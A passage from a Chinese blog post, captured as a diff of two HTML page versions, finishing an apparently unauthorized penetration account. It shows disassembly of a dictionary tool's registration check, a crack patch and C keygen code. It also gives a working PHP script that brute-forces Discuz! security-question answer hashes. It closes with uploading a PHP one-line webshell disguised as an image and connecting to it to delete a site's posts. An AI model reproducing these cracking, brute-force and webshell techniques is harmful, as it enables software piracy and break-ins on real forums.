ESI</p>  <p>004027E6 CALL &lt;superdic._sprintf&gt;</p>  <p>这段代码大概是使用GetVolumeInformationA函数再加上其他一系列操作生成申请号的过程，因为是逆注册算法，这一块我们不关心，可以直接f8过去看结果即可，而事实上也确实生成一个子串是24578843，与图19中的申请号相一致。</p>  <p>我接着往下走，前面不关键的地方就不跟了，一直走到这里：</p>  <p>/<em>403D48</em>/ LEA EAX,DWORD PTR DS:[EBX+6FC]</p>  <p>/<em>403D4E</em>/ PUSH ECX</p>  <p>/<em>403D4F</em>/ PUSH EAX</p>  <p>/<em>403D50</em>/ CALL superdic.004034E0</p>  <p>可以看到把申请号压入了堆栈，而函数CALL superdic.004034E0经判断是对申请号做了一次加密过程。从堆栈处看到加密后密文是：</p>  <p>0012EF6C 0012EFA0 ASCII &quot;BqwITTcm8kG5lcEk&quot;</p>  <p>接着再f8配合f7来慢慢走。</p>  <p>/<em>403D5B</em>/ PUSH ESI</p>  <p>/<em>403D5C</em>/ CALL superdic.00403630</p>  <p>403d5b的位置是把注册码压入堆栈，随即利用CALL superdic.00403630做了一次加密过程。</p>  <p>过了这个call后把我预设的123456789加密成了l6345q789.看下面堆栈数据。</p>  <p>0012EF64 0012FCA0 ASCII &quot;l6345q789&quot;</p>  <p>随后又经过一些对算法无用的代码后来到这里：</p>  <p>/<em>403EBD</em>/ MOV DL,BYTE PTR DS:[ESI]</p>  <p>/<em>403EBF</em>/ MOV CL,BYTE PTR DS:[EDI]</p>  <p>/<em>403EC1</em>/ MOV AL,DL</p>  <p>/<em>403EC3</em>/ CMP DL,CL</p>  <p>/<em>403EC5</em>/ JNZ SHORT superdic.00403EE5</p>  <p>/<em>403EC7</em>/ TEST AL,AL</p>  <p>/<em>403EC9</em>/ JE SHORT superdic.00403EE1</p>  <p>/<em>403ECB</em>/ MOV CL,BYTE PTR DS:[ESI+1]</p>  <p>/<em>403ECE</em>/ MOV DL,BYTE PTR DS:[EDI+1]</p>  <p>/<em>403ED1</em>/ MOV AL,CL</p>  <p>/<em>403ED3</em>/ CMP CL,DL</p>  <p>/<em>403ED5</em>/ JNZ SHORT superdic.00403EE5</p>  <p>/<em>403ED7</em>/ ADD ESI,2</p>  <p>/<em>403EDA</em>/ ADD EDI,2</p>  <p>/<em>403EDD</em>/ TEST AL,AL</p>  <p>/<em>403EDF</em>/ JNZ SHORT superdic.00403EBD</p>  <p>/<em>403EE1</em>/ XOR EAX,EAX</p>  <p>/<em>403EE3</em>/ JMP SHORT superdic.00403EEA</p>  <p>/<em>403EE5</em>/ SBB EAX,EAX</p>  <p>/<em>403EE7</em>/ SBB EAX,-1</p>  <p>/<em>403EEA</em>/ XOR EDX,EDX</p>  <p>/<em>403EEC</em>/ PUSH 476</p>  <p>/<em>403EF1</em>/ TEST EAX,EAX</p>  <p>/<em>403EF3</em>/ SETE DL</p>  <p>/<em>403EF6</em>/ MOV ECX,EBX</p>  <p>/<em>403EF8</em>/ MOV DWORD PTR DS:[EBX+90],EDX</p>  <p>这段代码即是：BqwITTcm8kG5lcEk与l6345q789的对比过程，如果相等就注册成功。</p>  <p>作者的大题思路就是这样吧，如果爆破的话只需要把403EF1处改为下面的代码即可。</p>  <p>/<em>403EF1</em>/ MOV DL,1</p>  <p>但分析到这里，爆破已经满足不了我的欲望了，再说离我的两个小时还差的远呢。接着看看作者算法的思路吧。</p>  <p>既然我分析的思路已经清晰，我在这里再稍作整理：、</p>  <p>设CALL superdic.004034E0函数=f1()</p>  <p>CALL superdic.00403630函数=f2()</p>  <p>如果f1(申请号)=f2(注册码) 那么就注册成功。</p>  <p>看来f2()函数是关键啊，需要写出它的逆函数，f7进去一看，貌似还很长，如图23：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image035" border="0" alt="clip_image035" src="http://img.cker.in/2_201D/clip_image035.jpg" width="434" height="427"></p>  <p>图23</p>  <p>仅仅图23的一页，还显示不完，我再次像骆驼一样的f7走来走去，再加上ida的f5，终于对这段代码有了初步的了解。</p>  <p>最终我使用了一种巧妙的办法写出了这段代码的逆函数如下。</p>  <p>有点基础的朋友自己看代码吧。我也不好在这里占用太大篇幅去深析这个算法的逆向过程。</p>  <p>void DicDecode(char <em>str)</em></p>  <p>{</p>  <p>char end[64]={0};</p>  <p>if (strlen(str) !=16) str=0;</p>  <p>for(int i=0,j=0;i&lt;16,j&lt;64;i++,j=j+4)</p>  <p>{</p>  <p>if(str[i]&lt;=’9’ &amp;&amp; str[i]&gt;=’0’)</p>  <p>{</p>  <p>end[j]=str[i]-22;</p>  <p>goto LABEL_a;</p>  <p>}</p>  <p>if(str[j]&lt;=’z’ &amp;&amp; str[i]&gt;=’a’)</p>  <p>{</p>  <p>end[j]=str[i]-61;</p>  <p>goto LABEL_a;</p>  <p>}</p>  <p>if(str[i]&lt;=’Z’ &amp;&amp; str[i]&gt;=’A’)</p>  <p>{</p>  <p>end[j]=str[i]-65;</p>  <p>}</p>  <p>LABEL_a:</p>  <p>;</p>  <p>}</p>  <p>for(i=0;i&lt;64;i=i+4)</p>  <p>{</p>  <p>if(end[i]&lt;=i)</p>  <p>{</p>  <p>end[i]=i-end[i];</p>  <p>}</p>  <p>}</p>  <p>int v10[16];</p>  <p>for(int k=0,n=0;k&lt;16,n&lt;64;k++,n=n+4)</p>  <p>{</p>  <p>v10[k]=(int)end[n];</p>  <p>}</p>  <p>for(i=0;i&lt;16;i++)</p>  <p>{</p>  <p>if(v10[i] &lt;= 25 &amp;&amp; v10[i]&gt;=0)</p>  <p>{</p>  <p>str[i]=v10[i]+ 65;</p>  <p>goto LABEL_bb;</p>  <p>}</p>  <p>if(v10[i] &lt;= 35 &amp;&amp; v10[i]&gt;=26)</p>  <p>{</p>  <p>str[i]=v10[i]+ 22;</p>  <p>goto LABEL_bb;</p>  <p>}</p>  <p>if(v10[i] &lt; 61 &amp;&amp; v10[i]&gt;=36)</p>  <p>{</p>  <p>str[i]=v10[i]+ 61;</p>  <p>}</p>  <p>LABEL_bb:</p>  <p>;</p>  <p>}</p>  <p>char sigeliu[5]={0x36,0x36,0x36,0x36,0};</p>  <p>strcat(str,sigeliu);</p>  <p>}</p>  <p>总之最后累的跟骆驼似的终于还是凑出了这个半成品的注册机。如图24：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image036" border="0" alt="clip_image036" src="http://img.cker.in/2_201D/clip_image036.jpg" width="495" height="316"></p>  <p>图24</p>  <p>该注册机的用法是在00403D5B处，看堆栈得到f1(申请号)= BqwITTcm8kG5lcEk.</p>  <p>把这个值写入密文框内，点击解密就得到其注册码。这时看了看表大概用了110分钟，好险，差点损失15块钱。</p>  <p>字典生成器破解完后，我开始酝酿写这个discuz! 提示问题的碰撞程序。由于php的易用性，我选择用它来写。说白了也就是个穷举的过程。代码如下：</p>  <p>&lt;?</p>  <p>/<em>discuz提示问题答案暴力破解程序。</em>/</p>  <p>error_reporting(0);</p>  <p>if ($argc&lt;2) {</p>  <p>print_r(‘</p>  <p>——————————————————————</p>  <p>Usage: php ‘.$argv[0].’ hash</p>  <p>Example:</p>  <p>php ‘.$argv[0].’ 91de8255</p>  <p>——————————————————————</p>  <p>‘);</p>  <p>die;</p>  <p>}</p>  <p>$fd=fopen(&quot;pass.dic&quot;,r);</p>  <p>if(!$fd)</p>  <p>{</p>  <p>echo &quot;error:打开字典文件错误&quot; ;</p>  <p>die;</p>  <p>}</p>  <p>while($buf=fgets($fd))</p>  <p>{ </p>  <p>for($i=1;$i&lt;8;$i++)</p>  <p>{</p>  <p>$tmp=substr(md5(trim($buf).md5($i)),16,8);</p>  <p>//echo $tmp;</p>  <p>$conn = strcmp($tmp,$argv[1]);</p>  <p>if($conn==0)</p>  <p>{</p>  <p>echo &quot;密码破解成功。\n&quot;.&quot;提示问题答案为：&quot;.$buf.&quot;提示的问题为:&quot;.theask((int)$i).&quot;\n&quot;;</p>  <p>die;</p>  <p>}</p>  <p>}</p>  <p>}</p>  <p>if($conn!=0)</p>  <p>{</p>  <p>echo &quot;没有正确的密码&quot;;</p>  <p>}</p>  <p>fclose($fd);</p>  <p>function theask($var){</p>  <p>if($var==1) {</p>  <p>return &quot;母亲的名字&quot;;</p>  <p>}</p>  <p>elseif($var==2) {</p>  <p>return &quot;爷爷的名字&quot;;</p>  <p>}</p>  <p>elseif($var==3) {</p>  <p>return &quot;父亲出生的城市&quot;;</p>  <p>}</p>  <p>elseif($var==4) {</p>  <p>return &quot;您其中一位老师的名字&quot;;</p>  <p>}</p>  <p>elseif($var==5) {</p>  <p>return &quot;您个人计算机的型号&quot;;</p>  <p>}</p>  <p>elseif($var==6) {</p>  <p>return &quot;您最喜欢的餐馆名称&quot;;</p>  <p>}</p>  <p>elseif($var==7) {</p>  <p>return &quot;驾驶执照最后四位数字&quot;;</p>  <p>}</p>  <p>}</p>  <p>?&gt;</p>  <p>我使用自己保存的100M大字典破解没有成功。后来我把这个脚本放在了一朋友的服务器上，然后用superdic生成了3G的大字典，直接丢在服务器上碰撞吧。</p>  <p><b></b></p>  <p>其实我坚信，在8位的字母加数字的大字典中去做碰撞的话肯定会成功的。只是我没有那么大的硬盘，只做了6位字母来测试。</p>  <p>又经过一天后，等我登陆朋友的服务器3389之时，我发现得到了结果如图25：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image037" border="0" alt="clip_image037" src="http://img.cker.in/2_201D/clip_image037.jpg" width="298" height="90"></p>  <p>图25</p>  <p>我敢肯定，ufedys肯定不是这个管理员的答案。于是hash相同，明文却不相同的碰撞终于成功了。我默默在心里说了声：碰撞V5。</p>  <p>剩下的应该比较容易了，登入后台，上传一个带php一句话木马的美女图片。（不要告诉我，你在discuz! X2后台找不到上传的地方啊）。然后利用类似这样的url：</p>  <p><a href="http://www.222.com/data/attachment/common/cf/212018txqnu4rcee3iek52.jpg/kyo.php" target="_blank" rel="external">http://www.222.com/data/attachment/common/cf/212018txqnu4rcee3iek52.jpg/kyo.php</a> 连接菜刀，就这样彻底拿下了该目标。</p>  <p>既然Webshell都拿到了，删帖子这么简单的事情还用我继续说吗？</p>  <p><b></b>到这里，费时两周的渗透也算是结束了，实战过程中其实还遇到了更多的各种各样问题，只不过本文是后来补写的，很多细节都忘却了，但主要的东西都已经在文章中体现了。</p>  <p>原文：转自混世魔王，作者太低调了就不贴出网址了，看文章学习交流就好，如果作者对转载有意见可以联系我。</p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/504.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/504.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/504.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/504.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/507.seo/">
-        ← VoIP渗透测试
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/502.seo/">
-        政府的数十万设备为什么连小黑客都挡不住 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/絮叨碎语/">絮叨碎语</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/507.seo/" title="VoIP渗透测试">
+  <strong>Prev:</strong><br/>
+  <span>
+  VoIP渗透测试</span>
+</a>
+</div>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/502.seo/"  title="政府的数十万设备为什么连小黑客都挡不住">
+ <strong>Next:</strong><br/> 
+ <span>政府的数十万设备为什么连小黑客都挡不住
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-2个星期艰难的渗透纪实" data-title="2个星期艰难的渗透纪实" data-url="http://ha.cker.in/504.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
